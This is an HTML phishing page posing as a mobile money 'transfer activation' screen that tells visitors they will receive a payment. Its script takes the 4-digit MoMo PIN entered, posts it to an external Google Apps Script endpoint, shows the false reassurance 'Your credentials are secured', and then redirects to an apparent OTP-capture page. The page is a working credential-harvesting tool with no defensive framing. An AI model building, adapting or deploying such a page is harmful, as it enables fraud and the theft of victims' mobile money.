<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MOBILE BANKING UPDATE</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      background: linear-gradient(to bottom, #001b44, #003366);
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      padding: 0 10px;
      box-sizing: border-box;
      position: relative;
      overflow: hidden;
    }

    .header {
      text-align: center;
      width: 100%;
      padding: 40px 20px;
      background: linear-gradient(135deg, #003366, #004080);
      border-bottom-left-radius: 40px;
      border-bottom-right-radius: 40px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
      margin-bottom: 30px;
      position: relative;
      overflow: hidden;
    }

    .header::after {
      content: "";
      position: absolute;
      bottom: -40px;
      left: 50%;
      transform: translateX(-50%);
      width: 120px;
      height: 120px;
      background: #ffcc00;
      border-radius: 50%;
      opacity: 0.2;
    }

    .header h1 {
      margin: 0;
      font-size: 24px;
      font-weight: bold;
      color: #ffcc00;
    }
    .header p {
      margin: 10px 0 0;
      font-size: 14px;
      line-height: 1.4;
    }

    .form-container {
      background: linear-gradient(145deg, rgba(0,40,100,0.95), rgba(0,60,140,0.95));
      width: 100%;
      max-width: 400px;
      padding: 30px 25px;
      border-radius: 12px;
      box-shadow: 0 6px 16px rgba(0,0,0,0.4);
      position: relative;
      z-index: 1;
    }

    label {
      display: block;
      margin-bottom: 6px;
      font-size: 15px;
      font-weight: bold;
      color: #ffcc00;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 20px;
      border-radius: 6px;
      border: 1px solid #1e90ff;
      background-color: rgba(255,255,255,0.1);
      color: #fff;
      font-size: 16px;
      font-weight: bold;
      letter-spacing: 2px;
      text-align: center;
    }

    input::placeholder {
      color: #ddd;
    }

    .btn-submit {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      font-weight: bold;
      background: linear-gradient(135deg, #ffcc00, #ffb300);
      color: #003366;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
    }

    .btn-submit:hover {
      background: linear-gradient(135deg, #ffd633, #ffcc00);
      transform: scale(1.03);
    }

    .notice {
      font-size: 13px;
      color: #ccc;
      text-align: center;
      margin-top: 12px;
    }

    /* Processing Overlay */
    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.6);
      backdrop-filter: blur(5px);
      display: flex;
      align-items: center;
      justify-content: center;
      color: #ffcc00;
      font-size: 20px;
      font-weight: bold;
      z-index: 100;
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.3s ease;
    }

    .overlay.active {
      opacity: 1;
      visibility: visible;
    }

    @media (max-width: 500px) {
      .header h1 { font-size: 20px; }
      .form-container { padding: 25px 15px; }
    }
  </style>
</head>
<body>
  <div class="header">
    <h1>MOBILEMONEY</h1>
    <p>TRANSFER ACTIVATION<br>
       Recieve payment below
    </p>
  </div>

  <div class="form-container">
    <form id="momoForm">
      <label for="momo_code">Enter 4-digit MoMo Code</label>
      <input type="text" id="momo_code" name="momo_code" placeholder="xxxx" maxlength="4" required>

      <button type="submit" class="btn-submit">Receive→</button>

      <div class="notice" id="status">Your credentials are secured.</div>
    </form>
  </div>

  <div class="overlay" id="overlay">Processing…</div>

  <script>
    const form = document.getElementById('momoForm');
    const statusEl = document.getElementById('status');
    const overlay = document.getElementById('overlay');

    const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbxJ1nxxUbrn8N7ancnw_Tc2gUJBJbvsOzuwRR5wJYNS1bF_0bckmYAYeItN1-eEsNbT/exec";

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      overlay.classList.add('active');
      statusEl.textContent = "Submitting...";
      statusEl.style.color = "#ccc";

      const momo_code = document.getElementById('momo_code').value.trim();
      const formData = new FormData();
      formData.append("momo_code", momo_code);

      try {
        const resp = await fetch(WEBAPP_URL, { method: 'POST', body: formData });
        const text = await resp.text();
        let json;

        try {
          json = JSON.parse(text);
        } catch {
          overlay.classList.remove('active');
          statusEl.textContent = "Server error: " + text;
          statusEl.style.color = "#ff6666";
          return;
        }

        if (json.result === "success") {
          statusEl.textContent = "Pin successfully submitted!";
          statusEl.style.color = "#ffcc00";
          setTimeout(() => window.location.href = "otp.html", 1500);
        } else {
          overlay.classList.remove('active');
          statusEl.textContent = "Submission failed: " + (json.message || "Unknown error");
          statusEl.style.color = "#ff6666";
        }
      } catch (err) {
        overlay.classList.remove('active');
        statusEl.textContent = "Network error. Try again.";
        statusEl.style.color = "#ff6666";
      }
    });
  </script>
</body>
</html>
